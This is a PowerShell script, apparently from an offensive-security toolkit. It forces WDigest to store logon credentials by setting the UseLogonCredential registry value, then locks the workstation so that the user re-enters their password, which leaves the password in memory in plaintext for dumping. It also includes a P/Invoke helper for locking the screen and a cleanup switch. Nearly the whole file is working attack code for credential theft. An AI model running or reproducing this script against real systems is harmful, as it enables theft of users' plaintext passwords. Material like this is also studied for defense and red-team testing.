function Invoke-LockWorkStation {
    # region define P/Invoke types dynamically
    #   stolen from PowerSploit https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
    #   thanks matt and chris :)
    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)
 
    $TypeBuilder = $ModuleBuilder.DefineType('Win32.User32', 'Public, Class')
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
        @('User32.dll'),
        [Reflection.FieldInfo[]]@($SetLastError),
        @($True))
 
    # Define [Win32.User32]::LockWorkStation()
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('LockWorkStation',
        'User32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [Bool],
        [Type[]]@(),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Ansi)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
    
    $User32 = $TypeBuilder.CreateType()
    
    $Null = $User32::LockWorkStation()
}


function Invoke-WdigestDowngrade {
    <#
    .SYNOPSIS
    Explicitly sets Wdigest on a Windows 8.1/Server 2012 machine to use logon credentials.
    Locks the screen after so the user must retype their password.

    License: BSD 3-Clause
    Author: @harmj0y
    
    .PARAMETER NoLock
    Doesn't lock the screen after registry set.

    .PARAMETER Cleanup
    Removes the registry key to force UseLogonCredential.

    .LINK
    https://www.trustedsec.com/april-2015/dumping-wdigest-creds-with-meterpreter-mimikatzkiwi-in-windows-8-1/

    #>
    [CmdletBinding()]
    Param (
        [Switch] $NoLock,
        [Switch] $Cleanup
    )

    $Principal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()

    if(-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        throw 'Administrative rights required. Execute this script from an elevated PowerShell prompt.'
    }

    if($Cleanup){
        try {
            Remove-ItemProperty -Force -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction Stop
            Write-Verbose "Wdigest set to not use logoncredential."
        }
        catch {
            Write-Verbose "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential not set"
        }
    }
    else{
        Set-ItemProperty -Force -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value "1"
        Write-Verbose "Wdigest set to use logoncredential."

        if(-not $NoLock){
            Invoke-LockWorkStation 
        }
    }
}